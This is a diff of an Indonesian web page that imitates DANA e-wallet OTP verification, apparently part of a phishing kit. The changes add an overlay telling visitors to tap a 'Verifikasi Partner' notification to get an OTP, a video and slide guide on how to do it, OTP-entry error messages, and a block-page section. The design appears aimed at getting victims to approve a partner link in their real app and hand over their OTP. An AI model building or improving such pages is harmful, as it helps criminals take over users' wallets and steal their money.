@@ -30,95 +30,43 @@ href="otx.css">
 
     </div>
 
-    <!-- ========================= -->
-<!-- NOTIF -->
-<!-- ========================= -->
+    <div class="intro-overlay" id="introOverlay">
 
-<div
-class="notif-overlay"
-id="notifOverlay">
+    <div class="intro-card">
 
-    <div
-    class="notif-box"
-    id="notifBox">
+        <h3>
+            Tap Notifikasi Verifikasi Partner
+        </h3>
 
-        <img
-        src="assets/notif.png"
-        class="notif-img">
+        <p>
+            untuk mendapatkan kode OTP
+        </p>
+
+        <div class="intro-video-card">
+            <video
+            src="assets/verifikasi.mp4"
+            autoplay
+            muted
+            loop
+            playsinline>
+            </video>
+        </div>
+
+        <button id="introBtn">
+            MENGERTI
+        </button>
 
     </div>
 
 </div>
-
-    <!-- TEKS MENUNGGU -->
-<div class="waiting-wrapper">
-
-    <div class="video-text">
-        Menunggu Konfirmasi di Aplikasi DANA
-    </div>
-
-    <div class="dots-loading">
-        <span></span>
-        <span></span>
-        <span></span>
-    </div>
-
-</div>
-
-<!-- VIDEO CARD -->
-<div class="card photo-card">
-
-    <video
-    class="photo-video"
-    autoplay
-    muted
-    loop
-    playsinline>
-
-        <source
-        src="assets/verifikasi.mp4"
-        type="video/mp4">
-
-    </video>
-
-</div>
-
-<button class="lanjut-btn" id="lanjutBtn">
-    LANJUTKAN
-</button>
-
-<!-- SOUND -->
-<audio
-id="successSound"
-autoplay>
-
-<source
-src="assets/successss.mp3"
-type="audio/mpeg">
-
-</audio>
-
-
-<div class="otp-card">
-
-  <button class="close-otp" id="closeOtp">
-    &times;
-</button>
-
-    <div class="title verifikasi-title">
-        
-        Jika Sudah di Verifikasi 
-
-    </div>
 
     <!-- TITLE -->
     <div class="title">
-        
-        Kode <b>OTP</b> Terkirim ke
+
+        Kode <b>OTP</b>
+        telah terkirim ke
 
     </div>
-
-
 
     <!-- NOMOR -->
     <div class="number-box">
@@ -198,9 +146,18 @@ type="audio/mpeg">
     <!-- ALERT -->
     <div class="alert-box error-box">
 
-        <div class="alert-title"></div>
+        <div class="alert-title">
 
-        <div class="alert-desc"></div>
+            Kode OTP salah atau kadaluarsa
+
+        </div>
+
+        <div class="alert-desc">
+
+            Pastikan Kode OTP yang kamu
+            masukan benar dan tidak kadaluarsa
+
+        </div>
 
     </div>
 
@@ -222,45 +179,39 @@ type="audio/mpeg">
 
     </div>
 
-    <div class="help-otp" id="helpOtp">
-    Tidak menerima kode OTP?
-</div>
+          <div class="guide-box">
 
-</div>
+    <h3>Cara Verifikasi Partner</h3>
 
-<div class="help-popup" id="helpPopup">
+    <div class="slide-box">
 
-    <div class="help-content">
-
-        <button class="help-close" id="helpClose">
-            &times;
+        <button id="prevBtn">
+            ‹
         </button>
 
-        <div class="help-title">
-            Jika belum menerima kode OTP
+        <div class="slide-card">
+
+            <img
+            id="slideImg"
+            src="assets/slide1.jpg"
+            class="slide-img">
+
         </div>
 
-        <div class="help-desc">
-            Pastikan kamu sudah verifikasi partner.
-            Jika kamu belum menerima notifikasi verifikasi partner,
-            pastikan nomor atau data yang kamu isi sudah benar.
-        </div>
-
-        <div class="help-subtitle">
-            Cara Verifikasi Partner
-        </div>
-
-        <div class="tutorial-box">
-
-    <img
-    src="assets/cara-verifikasi.jpg"
-    class="help-image">
-
-</div>
+        <button id="nextBtn">
+            ›
+        </button>
 
     </div>
 
+    <div class="slide-counter" id="slideCounter">
+        1 / 4
+    </div>
+
 </div>
+
+</div>
+
 
 <!-- BLOCK PAGE -->
 <div class="blocked-box">
